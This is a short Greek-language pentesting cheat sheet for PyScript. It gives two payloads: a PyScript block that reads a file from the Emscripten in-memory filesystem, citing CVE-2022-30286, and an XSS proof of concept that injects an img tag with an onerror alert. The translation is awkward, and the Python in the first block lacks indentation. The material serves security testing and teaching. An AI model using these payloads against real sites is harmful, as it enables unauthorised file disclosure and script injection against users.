## Οδηγός Πεντεστισμού PyScript

Το PyScript είναι ένα νέο πλαίσιο που αναπτύχθηκε για την ολοκλήρωση της Python στο HTML, ώστε να μπορεί να χρησιμοποιηθεί δίπλα στο HTML. Σε αυτό το σύντομο φύλλο απατηλών, θα βρείτε πώς να χρησιμοποιήσετε το PyScript για τους σκοπούς του πεντεστισμού.

### Απορρόφηση / Ανάκτηση αρχείων από το εικονικό σύστημα αρχείων μνήμης Emscripten:

`CVE ID: CVE-2022-30286`\
\
Κώδικας:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin:
out = fin.read()
print(out)
</py-script>
```

### Cross Site Scripting (Κανονικό)

Κώδικας:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
